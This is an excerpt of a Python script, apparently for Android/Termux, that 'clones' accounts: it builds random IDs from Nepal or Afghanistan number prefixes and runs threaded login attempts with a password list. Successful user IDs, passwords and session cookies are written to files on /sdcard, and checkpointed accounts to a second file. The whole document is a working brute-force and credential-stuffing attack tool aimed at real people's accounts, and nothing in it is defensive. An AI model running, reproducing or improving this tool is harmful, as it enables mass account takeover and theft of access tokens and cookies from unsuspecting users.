...
from concurrent.futures import ThreadPoolExecutor as Memek
princp=[]
usr=[]
loop = 0
bou = []
...
def Awm_rndm():
    clear()
    print(f'[#] IF THERE ARE NO RESULTS PLEASE KNOW ME')
    print(f'')
    print(f'[1]  NEPAL UID CLONING')
    print(f'[2]  AFGHANISTAN UID CLONING')
    awm = input(f'[#] SELECT OPTION  : ')
    print(f'')
    if awm in ['1']:Akash.nepal()
    elif awm in ['2']:Akash.afghan()
    else:Awm_rndm()

class Akash:
    def nepal():
        print(f'{G}EXAMPLE  : 9815,9814,9861,9840{X}')
        code = input(f'SELECT   : ')
        print(f'')
        print(f'{G}EXAMPLE  : 10000,20000,30000{X}')
        limit = int(input(f'SELECT   : '))
        print(f'')
        for n in range(limit):
            awmx = "".join(random.choice(string.digits) for _ in range(6))
            bou.append(awmx)
        with Memek(max_workers=35) as Ripal:
            tl = str(len(bou))
            ...
            for love in bou:
                ...
                Ripal.submit(crack_rand,ids,passlist)
        print('')    
    ...
    def afghan():
        print(f'{G}EXAMPLE  : 91637,91789,91620{X}')
        code = input(f'SELECT   : ')
        print(f'')
        print(f'{G}EXAMPLE  : 10000,20000,30000{X}')
        limit = int(input(f'SELECT   : '))
        ...
        for n in range(limit):
            ...
            bou.append(awmx)
        with Memek(max_workers=30) as Ripal:
            tl = str(len(bou))
            print(f"TOTAL ID FROM CRACK : {S} {tl}{W}")
...
def crack_rand(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r{M}[{G}RUNNING{M}]{W}<>{M}[{Y}%s{M}]{W}<>{M}[{G}ALIVE:%s{M}]'%(loop,len(oks)));sys.stdout.flush()
    sys.stdout.flush()
    try:
        for pas in passlist:
            data = {
            ...
            if "access_token" in po:
                ...
                print(f'\r\r {G}[DONNA-OK] {uid} | {pas}')
                open('/sdcard/DONNA-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
                ...
                open('/sdcard/DONNA-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
